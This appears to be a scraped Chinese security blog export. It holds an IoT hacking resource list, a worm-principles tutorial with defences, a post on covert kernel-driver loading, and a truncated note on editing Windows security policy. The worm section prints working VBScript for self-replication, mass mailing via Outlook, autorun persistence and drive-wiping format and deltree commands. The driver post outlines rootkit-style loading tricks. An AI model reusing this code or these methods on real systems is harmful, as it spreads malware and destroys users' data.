如果你不学习单片机，直接进行物联网方向的安全分析也是没有问题，这方面实际只要找到了攻击面，就好入手，但是高手都是会了解得更深入才能最大限度的扩大攻击面。 2.汇编知识，实际上对于8051,avr,arm,mips这些处理器架构，大家不必要去纠结汇编问题，当你研究某一个平台时有一本参考书籍就可以了，这些都是公共平台。 3.电子电路，这一块不需要太过于深入，能够简单识别电器元件以及其功能，能够识别框图，读懂一些芯片图，引脚和接口图就可以。主要当你拆解一款设备后，你能够认识那些是控制器，那些是flash，以及找到datasheet后能够看懂芯片说明图。 4.熟悉一些工具的使用是必备的： 1)调试工具比如JTAG/SWD仿真器，OPENJTAG, 使用usb转串口工具等等，如果能够准确找到相关MCU相关的编程器的话就更好。这方面在后需要的文章中会给大家介绍，如何使用OPENOCD来进行固件调试，以及如何直接取出FLASH并且读取FLASH数据。 2)USB协议分析工具如USBPcap，Wireshark.这些工具在该设备提供升级但是你又无法进行调试时用来分析USB数据包，你可以分析升级固件程序的机制，然后使用libusb库来编写自己的固件dump工具和擦写工具。这块后续通过分析文章给大家介绍。 3)有一定基础后可以自己DIY调试仿真器，FLASH读取器等，按照自己的需求进行设计，现在国外很多爱好者都是自制的。 下面是一些资源，欢迎大家补充： dfrobot机器人开源网站 http://wiki.dfrobot.com.cn/index.php?title=%E9%A6%96%E9%A1%B5 Crazepony开源微型四轴飞行器 www.crazepony.com 互联网在线设备搜索引擎，绝对的神器，你可以找到全世界在线的网络摄像头、路由器、信号灯、核电站等有信息漏洞的设备： https://www.shodan.io/ 芯片手册 http://www.datasheet-pdf.com 芯片型号及其所属的内核芯片家族： http://www.myir-tech.com/resource/450.asp 施耐德PLC以太网模块固件后门： http://www.360doc.com/content/15/1018/18/471722_506538554.shtml# 揭秘黑客是如何黑掉三星NX300智能相机的 http://www.freebuf.com/vuls/99951.html 向硬盘固件程序嵌入代码 http://www.sosit.com.cn/de_news/de_yjxw/5949.html openOCD+jlink调试uboot http://blog.chinaunix.net/uid-11319766-id-3060018.html 最低成本的ARM调试解决方案 http://blog.csdn.net/enbiting/article/details/7190794 libusb库官网： http://www.libusb.org/wiki/libusb-win32#Installation USBpcap,Wireshark,usb协议分析必备 http://desowin.org/usbpcap/ https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=8503 通用usb驱动libusb介绍和使用示例 http://www.cnblogs.com/image-eye/archive/2011/08/30/2159897.html 常见基站定位/基站数据查询网站 http://www.cellid.cn/ https://www.juhe.cn/d/cellmap/gsm.php http://www.jizhanyun.com Kautilya是一个给人机接口设备提供各种payload的工具包，比如可以烧录给teensy，它可以帮助人们进行渗透测试。 https://github.com/samratashok/Kautilya 劫持无线鼠标项目 https://github.com/RFStorm/mousejack ZigBee（无线通信）安全研究工具包 https://github.com/RFStorm/killerbee 物联网安全：LED灯中存在多个安全漏洞 https://blog.viktorstanchev.com/2015/12/20/the-many-attacks-on-zengge-wifi-lightbulbs/ 汽车黑客揭秘：我是如何通过逆向API接口黑掉宝马i3的 https://shkspr.mobi/blog/2015/11/reverse-engineering-the-bmw-i3-api/ https://github.com/edent/BMW-i-Remote/ [CTF入门培训]顶尖高校博士及硕士团队亲授《30小时教你玩转CTF》，视频+靶场+题目！助力进入CTF世界 上传的附件： 嵌入式Linux内核启动部分代码分析.pdf （185.85kb，711次下载） arm启动原理及代码分析.pdf （216.10kb，657次下载） ATmega8启动代码分析.doc （172.50kb，336次下载） VxWorks开发教程.pdf （2.27MB，504次下载） FreeRTOS入门手册_中文.rar （1.89MB，515次下载） Hex文件格式资料中英文对照 .pdf （71.29kb，494次下载） 单片机的40个实验.pdf （2.56MB，607次下载） HT6221遥控.pdf （214.00kb，367次下载） 红外线解密器.doc （41.00kb，455次下载）","tags":""},{"title":"实例解析蠕虫病毒的原理(ZT)","url":"/20240324/shi-li-jie-xi-ruan-chong-bing-du-de-yuan-li-zt/","text":"转载自 实例解析蠕虫病毒的原理(ZT) 实例解析蠕虫病毒的原理 如今对大家的电脑威胁最大的就属网络蠕虫病毒了！网络蠕虫病毒的危害之大简直令人吃惊，从大名鼎鼎的“爱虫”到“欢乐时光”，再到“红色代码”，其破坏力越来越强，因此我们有必要了解网络蠕虫病毒。 蠕虫病毒与一般的计算机病毒不同，它不采用将自身拷贝附加到其他程序中的方式来复制自己，所以在病毒中它也算是一个“另类”。蠕虫病毒的破坏性很强，部分蠕虫病毒不仅可以在因特网上兴风作浪，局域网也成了它们“施展身手”的舞台――蠕虫病毒可以潜伏在基于客户机/服务机模式的局域网的服务机上的软件内，当客户机访问服务机，并对有毒的软件实施下载后，病毒就神不知、鬼不觉地从服务机上“拷贝”到客户机上了。 其实脚本病毒是很容易制造的，它们都利用了视窗系统的开放性的特点。特别是COM到COM+的组件编程思路，一个脚本程序能调用功能更大的组件来完成自己的功能。以VB脚本病毒(如欢乐时光、 I Love You 、库尔尼科娃病毒、Homepage病毒等)为例，他们都是把.vbs脚本文件添在附件中，最后使用*.htm.vbs等欺骗性的文件名。下面我们详细了解一下蠕虫病毒的几大特性，从中找到对付蠕虫病毒的方法。 一、蠕虫病毒具有自我复制能力 我们以普通的VB脚本为例来看看： JavaScript代码 1234Set objFs=CreateObject (&quot;Scripting.FileSystemObject&quot;) &#x27;创建一个文件系统对象objFs.CreateTextFile ( &quot;C:\\virus.txt&quot; , 1 )&#x27;通过文件系统对象的方法创建了一个TXT文件。 如果我们把这两句话保存成为.vbs的VB脚本文件，点击就会在C盘中创建一个TXT文件了。倘若我们把第二句改为： JavaScript代码 1objFs.GetFile (WScript.ScriptFullName).Copy ( &quot;C:\\virus.vbs&quot; ) 就可以将自身复制到C盘virus.vbs这个文件。本句前面是打开这个脚本文件，WScript.ScriptFullName指明是这个程序本身，是一个完整的路径文件名。GetFile函数获得这个文件，Copy函数将这个文件复制到C盘根目录下virus.vbs这个文件。这么简单的两句就实现了自我复制的功能，已经具备病毒的基本特征――自我复制能力。 二、蠕虫病毒具有很强的传播性 病毒需要传播，电子邮件病毒的传播无疑是通过电子邮件传播的。对于OutLook来说地址簿的功能相当不错，可是也给病毒的传播打开了方便之门。几乎所有通过OutLook传播的电子邮件病毒都是向地址簿中存储的电子邮件地址发送内同相同的脚本附件完成的。 看看如下的代码： JavaScript代码 12345678910111213141516171819202122232425Set objOA=Wscript.CreateObject ( &quot;Outlook.Application&quot; ) &#x27;创建一个OUTLOOK应用的对象Set objMapi=objOA.GetNameSpace ( &quot;MAPI&quot; )&#x27;取得MAPI名字空间 For i= 1 to objMapi.AddressLists.Count &#x27;遍历地址簿Set objAddList=objMapi.AddressLists (i)For j= 1 To objAddList. AddressEntries.CountSet objMail=objOA.CreateItem ( 0 )objMail.Recipients.Add (objAddList. AddressEntries (j))&#x27;取得收件人邮件地址objMail.Subject= &quot;你好!&quot;&#x27;设置邮件主题objMail.Body= &quot;这次给你的附件，是我的新文档！&quot;&#x27;设置信件内容objMail.Attachments.Add (&quot;c:\\virus.vbs &quot;)&#x27;把自己作为附件扩散出去&#x27;objMail.Send&#x27;发送邮件&#x27;NextNextSet objMapi= Nothing&#x27;清空objMapi变量，释放资源，值得学习的编程习惯Set objOA= Nothing&#x27;清空objOA变量 这一小段代码的功能是向地址簿中的用户发送电子邮件，并将自己作为附件扩散出去。这段代码中的第一行是创建一个Outlook的对象，是必不可少的。在其下是一个循环，在循环中不断地向地址簿中的电子邮件地址发送内容相同的信件。蠕虫病毒就是这样进行传播的。 三、蠕虫病毒具有一定的潜伏性 要使病毒潜伏，对于“脚本”语言并不是很难的一件事，因为这种语言并不是面向对象的可视化编程，自然就不存在窗体，所以可以免去隐藏窗体的麻烦。从I love you病毒中，很容易看出蠕虫病毒在潜伏时的特点，它们多数是修改注册表等信息以判断各种条件及取消一些限制。以下是从I love you病毒中提取出的部分代码： JavaScript代码 1234567891011On Error Resume Next &#x27;容错语句，避免程序崩溃dim wscr,rrset wscr=CreateObject ( &quot;WScript.Shell&quot; )&#x27;击活 WScript.Shell 对象 rr=wscr.RegRead ( &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Scripting Host\\Settings\\Timeout&quot; ) &#x27;读入注册表中的超时键值if (rr&gt;= 1 ) then&#x27;超时设置wscr.RegWrite &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Scripting Host\\Settings\\Timeout&quot; , 0 , &quot;REG_DWORD&quot;end if 上面这部分代码很明显是调整脚本语言的超时设置。下面的一段代码则是修改注册表，使得每次系统启动自动执行脚本： JavaScript代码 12regcreate &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSKernel32&quot; ,dirsystem &quot;\\MSKernel32.vbs&quot; regcreate &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Win32DLL&quot; ,dirwin &quot;\\Win32DLL.vbs&quot; 其中MSKernel32.vbs和Win32DLL.vbs是病毒脚本的一个副本。怎么样，看出蠕虫病毒是怎样潜伏的吧？ 四、蠕虫病毒具有特定的触发性 在这里我们以时间触发为例，使用一个很简单的判断程序，来判断时间到了没有，如果有就开始执行代码。好，我们看看程序： JavaScript代码 1234x=time () if x=xx.xx.xx then ………… end if 就这么简单一个程序，就可以实现特定条件触发事件的目的。当然了，病毒制作者还可以通过监视运行某个程序而触发事件，也可以响应键盘触发事件等等。 五、蠕虫病毒具有很大的破坏性 蠕虫病毒的破坏性大家都有所了解吧？我们以著名的蠕虫病毒Jessica Worm中的部分破坏代码为例来加以分析说明： JavaScript代码 1234567891011121314151617181920212223242526272829303132333435363738394041sub killc () &#x27;破坏硬盘的过程On Error Resume Next&#x27;容错语句，避免程序崩溃 dim fs,auto,disc,ds,ss,i,x,dir Set fs = CreateObject ( &quot;Scripting.FileSystemObject&quot; ) Set auto = fs.CreateTextFile ( &quot;c:\\Autoexec.bat&quot; , True ) &#x27;建立或修改自动批处理auto.WriteLine ( &quot;@echo off&quot; )&#x27;屏蔽掉删除的进程auto.WriteLine ( &quot;Smartdrv&quot; )&#x27;加载磁盘缓冲，好毒啊！Set disc = fs.Drives&#x27;得到驱动器的集合For Each ds in discIf ds.DriveType = 2 Then&#x27;如果驱动器是本地盘ss = ss &amp;&amp;nbsp;ds.DriveLetter&#x27;就将符号连在一起End ifNextss=LCase (StrReverse (Trim (ss)))&#x27;得到符号串的反向小写形式For i= 1 to Len (ss)&#x27;遍历每个驱动器x= Mid (ss,i, 1 )&#x27;读每个驱动器的符号auto.WriteLine ( &quot;format/autotest/q/u &quot; &amp;x&amp; &quot;:&quot; )&#x27;反向 (从Z:到A:)自动格式化驱动器，狠毒啊！nextFor i= 1 to Len (ss)x= Mid (ss,i, 1 )auto.WriteLine ( &quot;deltree/y &quot; &amp;x &quot;:&quot; )&#x27;怕Format失效用Deltree双保险，知道厉害了吧nextauto.Close&#x27;关闭批处理文件set dir=fs.GetFile ( &quot;c:\\Autoexec.bat&quot; )dir.attributes=dir.attributes+ 2 &#x27;将自动批处理文件改为隐藏End sub 如果以前你没有亲身体验到蠕虫病毒的厉害，那么从这个小例子中，你应该知道蠕虫病毒的厉害了吧？ 六、反击蠕虫病毒 我们已经了解网络蠕虫病毒的构造，现在可以逐个击破网络蠕虫病毒几大功能模块。使网络蠕虫病毒不能这么横行无忌的破坏我们的电脑及盗窃我们的资料。 1.首先我们应该先看看如何破解病毒的破坏力最强的功能模块――病毒的破坏性。 网络蠕虫病毒不可能像传统病毒一样调用汇编程序来实现破坏功能。它只能通过调用已经编译好的带有破坏性的程序来实现这一功能。那么我们就把本地的带有破坏性的程序改名字，比如把format.com改成fmt.com，那样病毒的编辑者就无发实现用调用本地命令来实现这一功能。(这方法简单易行并不影响电脑的正常使用，但也有其不足的地方，我们会在下文中会对其不足进行说明。) 2.我们再看看如何破解病毒的潜伏性及触发性功能模块。 它是通过死循环语句完成的，且一开机就运行这程序，等待触发条件。用Ctrl+Alt+Del弹出关闭程序对话框方可看见一个叫 Wscript.exe的程序在后台运行(那样的程序不一定是病毒，但病毒也常常伪装成那样的程序)，我们为了防止病毒对我们的机算机进行破坏，我们不得不限制这类程序的运行时间(宁可错杀一千，也不可放过一个)，以达到控制的效果。首先在“开始”菜单的“运行”里输入“Wscript”，然后会弹出一个窗体。单击“经过以下数秒终止脚本”前面的复选框，使复选框前面打起钩，然后调整下方的时间设为最小值即可。这样可以破解一部分这样的病毒的潜伏，消除潜伏性自然触发性就破解了。 另外，由于蠕虫病毒大多是用VBScript脚本语言编写的，而VBScript代码是通过Windows Script Host来解释执行的，因此将Windows Script Host删除，就再也不用担心这些用VBS和JS编写的病毒了！从另一个角度来说，Windows Script Host本来是被系统管理员用来配置桌面环境和系统服务，实现最小化管理的一个手段，但对于大部分一般用户而言，WSH并没有多大用处，所以我们可以禁止 Windows Script Host。 卸载Windows Scripting Host： 在Windows98中(NT4.0以上同理)，打开“控制面板”，打开“添加/删除程序”，点选“Windows安装程序”，再鼠标双击其中的“附件”一项，然后再在打开的窗口中将“Windows Scripting Host”一项的“对勾”去掉，然后点“确定”，再点“确定”，这样就可以将Windows Scripting Host卸载。 如果你嫌麻烦，可以到Windows目录中，找到WScript.exe和JScript.exe，更改其名称或者干脆删除。 3.接下来就该破解病毒的自我复制能力功能模块。 大多数利用VBscript编写的病毒，自我复制的原理基本上是利用程序将本身的脚本内容复制一份到一个临时文件，然后再在传播的环节将其作为附件发送出去。而该功能的实现离不开“FileSystemObject”对象，因此禁止了“FileSystemObject”就可以有效的控制VBS病毒的传播。具体操作方法：用regsvr32 scrrun.dll /u这条命令就可以禁止文件系统对象。 4.破解完了以上四个功能模块，自然第五个功能模块传播性就不攻自破了。你还记不记得以上我们所说过的破解功能模块的不足，虽然限制别人不能调用你的带有破坏性的程序，但你也别忘了，别人可以用网页拷贝的方式放入你的计算机中，再通过以上方法对你的计算机进行危害。要彻底防治网络蠕虫病毒，还须设置一下你的浏览器。方法是：在IE窗口中点击“工具→Internet选项，在弹出的对话框中选择“安全”标签，再点击“自定义级别”按钮，就会弹出“安全设置”对话框，把其中所有ActiveX插件和控件以及Java相关全部选择“禁用”即可。不过，这样做在以后的网页浏览过程中可能会造成一些正常使用 ActiveX的网站无法浏览。有利就有弊，您还是自己看着办吧。 只要用了以上的方法就可以有效地防范蠕虫病毒，现在，你不会认为蠕虫病毒可怕了，至少，对蠕虫病毒的神秘感打消了吧？如是，则达到了我们的目的！","tags":""},{"title":"无耻的驱动加载法(ZT)","url":"/20240324/wu-chi-de-qu-dong-jia-zai-fa-zt/","text":"转载自 无耻的驱动加载法(ZT) 无耻的驱动加载法 from : http : //www.debugman.com/read.php?tid=614 方法一： 替换win32k . sys 在 2k3 的系统下ZwSetSystemInformation禁止了用户模式下加载驱动，只允许SMSS . exe加载win32k . sys。于是我们可以利用一下这个特点： 1. 注入SMSS . EXE 2. 打开SeLoadDriverPrivilege权限 3. 把原始的win32k . sys改名 4. 复制我们的驱动到\\systemroot\\system32下 5. 在SMSS . EXE中加载\\SystemRoot\\System32\\win32k . sys 6. 把\\SystemRoot\\System32\\win32k . sys改名 7. 把原始的win32k . sys文件改名改回去` 方法二： 利用第三方驱动程序的漏洞 这类驱动应该挺多的，我们可以选择一些装机量大的驱动来进行此项工作，如某某著名的杀毒软件即存在本地权限提升漏洞。。。获得了ring0权限再用ZwSetSystemInformation加载就万事大吉了 方法三： 感染随系统启动的驱动程序 此法类似于病毒感染，但需要等到下次系统重启才能拿到控制权，需要一些PE知识，这个我就不多说了。 这里顺便再说说通过ZwSetSystemInformation其实也是可以建立Device的，由于ZwSetSystemInformation加载驱动时传给DriverEntry的DriverObject指针是错误的，因此我们不能用它来创建Device, 但我们可以自己分配一个DriverObject来创建，如下： 12345678910111213141516171819202122232425262728293031323334353637NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject , IN PUNICODE_STRING RegistryPath) &#123; NTSTATUS ntStatus = STATUS_SUCCESS ; UNICODE_STRING ntUnicodeString ; UNICODE_STRING ntWin32NameString ; PDEVICE_OBJECT deviceObject = NULL ; ULONG i ; DriverObject = ExAllocatePoolWithTag ( NonPagedPool , sizeof ( DRIVER_OBJECT ), &#x27;clAS&#x27; ); // 分配DriverObject RtlZeroMemory ( DriverObject , sizeof ( DRIVER_OBJECT )); RtlInitUnicodeString ( &amp; ntUnicodeString , NT_DEVICE_NAME ); ntStatus = IoCreateDevice ( DriverObject , 0 , &amp; ntUnicodeString , 0x8800 , //设备类型必须为自定义的 FILE_DEVICE_SECURE_OPEN , TRUE , &amp; deviceObject ); if ( ! NT_SUCCESS ( ntStatus ) ) &#123; DbgPrint ( &quot;Couldn&#x27;t create the device object\\n&quot; ); return ntStatus ; &#125; // 注意，需要我们自己来清除INITIALIZING标志，否则设置不能打开 ClearFlag ( deviceObject -&gt; Flags , DO_DEVICE_INITIALIZING ); DriverObject -&gt; MajorFunction [ IRP_MJ_CREATE ] = CreateClose ; DriverObject -&gt; MajorFunction [ IRP_MJ_CLOSE ] = CreateClose ; // 注意，必须要给IRP_MJ_CLEANUP分派一个DispathRoutine, 否则在设备关闭的时候就会挂 DriverObject -&gt; MajorFunction [ IRP_MJ_CLEANUP ] = CreateClose ; DriverObject -&gt; MajorFunction [ IRP_MJ_DEVICE_CONTROL ] = DeviceControl ; // 注意，必须是Global符号连接, 否则程序退出后连接会消失 RtlInitUnicodeString ( &amp; ntWin32NameString , L &quot;\\\\DosDevices\\\\Global\\\\RkrTest&quot; ); ntStatus = IoCreateSymbolicLink ( &amp; ntWin32NameString , &amp; ntUnicodeString ); if ( ! NT_SUCCESS ( ntStatus ) ) &#123; DbgPrint (( &quot;Couldn&#x27;t create symbolic link\\n&quot; )); IoDeleteDevice ( deviceObject ); &#125; return ntStatus ; &#125; 如果你高兴的话在分配空间的时候分配多一点，把OBJECT_HEADER也算上，这样可以避免某些软件扫描DriverObject的对象头时挂掉 . 相应的用CreateFile时打开时应像这样指定“\\\\ . \\Global\\SymbolLink” 还有哪些无耻的办法大家可以讨论一下 `","tags":""},{"title":"用C++修改本地安全策略","url":"/20240324/yong-c-xiu-gai-ben-di-an-quan-ce-lue/","text":"转载自 用C++修改本地安全策略 (更新：注意编译运行文中程序后留意administrator可能会变成active=no，undocument，undocument…哈哈) 要写个修改本地安全策略的工具，本以为修改注册表就行了，没想到还挺复杂，改策略，对应的注册表项会变，倒过来，改对应的注册表项，策略没变，郁闷 [HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account] |--------------------------------修改次数 “F”=hex:02,00,01,00,00,00,00,00,e0,7c,9e,21,1a,12,c6,01,43,00,00,00,00,00,00,\\ 00 ~ 22 00,00,80,d2,16,47,b9,ff,ff,00,80,2c,ab,6d,fe,ff,ff,00,00,00,00,00,00,00,80,\\ 23 ~ 47 00,cc,1d,cf,fb,ff,ff,ff,00,cc,1d,cf,fb,ff,ff,ff,00,00,00,00,00,00,00,00,f1,\\ 48 ~ 72 03,00,00,00,00,00,00,02,00,18,00,00,00,00,00,01,00,00,00,03,00,00,00,01,00,\\ 73 ~ 97 ^^ ^ || | || |__ 密码长度最小值 || ||__ 密码必须符合复杂性要求(0为禁止) |___ 用可还原的加密来存储密码 第 76 80 位 [HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5] “F”=hex:02,00,01,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\ 00,80,c6,50,1f,2b,12,c6,01,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\ f5,01,00,00,01,02,00,00,15,02,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\ ^ |____ Guest账号(15禁用,14启用) 第 56 位 比如第76位, 0的时候是&quot;密码必须符合复杂性要求 - 禁用&quot; &amp; “用可还原的加密来存储密码 - 禁用” 14的时候&quot;密码必须符合复杂性要求 - 禁用&quot; &amp; “用可还原的加密来存储密码 - 启用” 有些比如密码长度,锁定什么的用NetUserModalsSet的USER_MODALS_INFO_0和USER_MODALS_INFO_3结构可以搞定。 审核策略用LsaSetInformationPolicy也好搞定，都有现成的代码。 账户策略-&gt;密码策略中的&quot;密码必须符合复杂性要求&quot;和&quot;用可还原的加密来存储密码&quot;，还有安全选项中的内容，似乎没有公开文档 没想到写个这个破工具还要用到未公开API函数，之前在网上查了下有没有相关代码或文档什么的，查了N天google和MSDN，有问的，没有答的，或者就是答非所问，没办法只能自己想办法了 之前使用apimonitor（N多此类工具，都不好用，这个也不咋样），在修改策略的时候获得了如下信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192API Name Return Value Module Name Time Start IsEntry API Process: c:\\\\windows\\\\system32\\\\mmc.exe(5052) , Thread:2976 SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceOpenProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetSecurityProfileInfo 6 (0x6) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetSecurityProfileInfo 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:38 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:34 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:34 True SceGetServerProductType 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:34 True SceRollbackTransaction 12 (0xC) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True SceCloseProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True SceFreeProfileMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True SceFreeProfileMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True SceFreeProfileMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True SceFreeProfileMemory 1 (0x1) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:55 True Process: c:\\\\windows\\\\system32\\\\mmc.exe(5052) , Thread:3928 SceOpenProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:49 True SceGetSecurityProfileInfo 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:49 True SceCloseProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:49 True SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:49 True SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:49 True SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:56 True SceUpdateSecurityProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:10:56 True Process: c:\\\\windows\\\\system32\\\\mmc.exe(5052) , Thread:5472 SceFreeMemory 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:43 True SceUpdateSecurityProfile 0 (0x0) C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll 2008-1-27 23:11:43 TrueSummary Information API Name: SceOpenProfile API Define: (Undefine API) Time Start: 00:11:49.015 Duration: 0.000 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: 29449864 (0x1C15E88) Pointer Paramter1: 1 (0x1) Pointer Paramter2: 23981584 (0x16DEE10) Pointer Paramter3: (null) Pointer Paramter4: 8629392 (0x83AC90) Pointer Paramter5: (null) After Call Parameters Pointer Paramter0: 29449864 (0x1C15E88) Pointer Paramter1: 1 (0x1) Pointer Paramter2: 23981584 (0x16DEE10) Pointer Paramter3: (null) Pointer Paramter4: 8629392 (0x83AC90) Pointer Paramter5: (null) Return 0 (0x0)Summary Information API Name: SceGetSecurityProfileInfo API Define: (Undefine API) Time Start: 00:11:49.015 Duration: 0.001 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: 688576 (0xA81C0) Pointer Paramter1: 302 (0x12E) Pointer Paramter2: 65535 (0xFFFF) Pointer Paramter3: 8629480 (0x83ACE8) Pointer Paramter4: 23981572 (0x16DEE04) Pointer Paramter5: 2088955995 (0x7C82F05B) After Call Parameters Pointer Paramter0: 688576 (0xA81C0) Pointer Paramter1: 302 (0x12E) Pointer Paramter2: 65535 (0xFFFF) Pointer Paramter3: 8629480 (0x83ACE8) Pointer Paramter4: 23981572 (0x16DEE04) Pointer Paramter5: 2088955995 (0x7C82F05B) Return 0 (0x0) GetLastError Value:3758096642 Description:Summary Information API Name: SceCloseProfile API Define: (Undefine API) Time Start: 00:11:49.109 Duration: 0.000 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: 23981584 (0x16DEE10) Pointer Paramter1: 2088955995 (0x7C82F05B) Pointer Paramter2: 8629392 (0x83AC90) Pointer Paramter3: 8570560 (0x82C6C0) Pointer Paramter4: 8629296 (0x83AC30) Pointer Paramter5: 302124616 (0x12020E48) After Call Parameters Pointer Paramter0: 23981584 (0x16DEE10) Pointer Paramter1: 2088955995 (0x7C82F05B) Pointer Paramter2: 8629392 (0x83AC90) Pointer Paramter3: 8570560 (0x82C6C0) Pointer Paramter4: 8629296 (0x83AC30) Pointer Paramter5: 302124616 (0x12020E48) Return 0 (0x0)Summary Information API Name: SceAddToNameStatusList API Define: (Undefine API) Time Start: 00:11:49.109 Duration: 0.000 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: 23981476 (0x16DEDA4) Pointer Paramter1: 787520 (0xC0440) Pointer Paramter2: 76 (0x4C) Pointer Paramter3: 1 (0x1) Pointer Paramter4: (null) Pointer Paramter5: 8629392 (0x83AC90) After Call Parameters Pointer Paramter0: 23981476 (0x16DEDA4) Pointer Paramter1: 787520 (0xC0440) Pointer Paramter2: 76 (0x4C) Pointer Paramter3: 1 (0x1) Pointer Paramter4: (null) Pointer Paramter5: 8629392 (0x83AC90) Return 0 (0x0)Summary Information API Name: SceFreeMemory API Define: (Undefine API) Time Start: 00:11:49.109 Duration: 0.000 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: 1514080 (0x171A60) Pointer Paramter1: 311 (0x137) Pointer Paramter2: (null) Pointer Paramter3: 8629392 (0x83AC90) Pointer Paramter4: (null) Pointer Paramter5: 4 (0x4) After Call Parameters Pointer Paramter0: 1514080 (0x171A60) Pointer Paramter1: 311 (0x137) Pointer Paramter2: (null) Pointer Paramter3: 8629392 (0x83AC90) Pointer Paramter4: (null) Pointer Paramter5: 4 (0x4) Return 0 (0x0)Summary Information API Name: SceUpdateSecurityProfile API Define: (Undefine API) Time Start: 00:11:52.203 Duration: 0.000 ms Module Name: C:\\\\WINDOWS\\\\system32\\\\SCECLI.dll Is Entry API: True Process: C:\\\\WINDOWS\\\\system32\\\\mmc.exe Thread: 4152 Before Call Parameters Pointer Paramter0: (null) Pointer Paramter1: 1 (0x1) Pointer Paramter2: 28866104 (0x1B87638) Pointer Paramter3: 4 (0x4) Pointer Paramter4: (null) Pointer Paramter5: 8629056 (0x83AB40) After Call Parameters Pointer Paramter0: (null) Pointer Paramter1: 1 (0x1) Pointer Paramter2: 28866104 (0x1B87638) Pointer Paramter3: 4 (0x4) Pointer Paramter4: (null) Pointer Paramter5: 8629056 (0x83AB40) Return 0 (0x0) 郁闷的是before call和after call参数都没变，不知道是软件问题还是未注册的原因 请教了czy，帮忙逆向了一下，高手就是高手，没多久就给我一段asm代码解决了密码复杂度的策略 1234567891011121314151617181920212223242526272829303132333435363738`.386.model 